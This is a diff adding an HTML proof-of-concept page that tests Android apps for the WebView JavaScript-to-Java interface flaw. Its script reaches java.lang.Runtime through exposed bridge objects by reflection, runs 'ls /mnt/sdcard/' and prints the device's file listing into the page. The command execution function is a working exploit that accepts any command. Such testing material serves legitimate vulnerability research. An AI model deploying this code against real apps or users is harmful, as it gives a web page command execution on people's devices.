@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8" />
+<title> Testing for JS-to-Java Interface Vulnerabilities </title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+</head>
+<body>
+<p>
+<b>
+If this app contains JS-to-Java Interface Vulnerabilities, we will print all file names in your device SD card:
+</b>
+</p>
+<script>
+function check()
+{
+    var flag=false;
+    for (var obj in window) 
+    {
+        try {
+            if ("getClass" in window[obj]) {
+                try{
+                    window[obj].getClass(); 
+					flag=true;
+					var cmdArgs=["ls","/mnt/sdcard/"];
+					var p = execute(window[obj],cmdArgs);
+                    document.write(getContents(p.getInputStream()));
+					break;
+                }catch(e){
+                }  
+            }
+        } catch(e) {
+        }
+    }
+	if(flag==false){
+	     alert("No this kind of vulnerabilities!");
+	}
+}
+function execute(JsInterface,cmdArgs)
+{
+     return  JsInterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).
+	         invoke(null,null).exec(cmdArgs);
+}
+var i=1;
+function getContents(inputStream)
+{
+     var contents = ""+i;
+     var b = inputStream.read();
+     var i = 1;
+     while(b != -1) {
+        var bString = String.fromCharCode(b);
+        contents += bString;
+		contents += " \n ";
+        b = inputStream.read();
+    }
+    i=i+1;
+    return contents;
+}
+check();       
+</script>
+</body>
+</html>
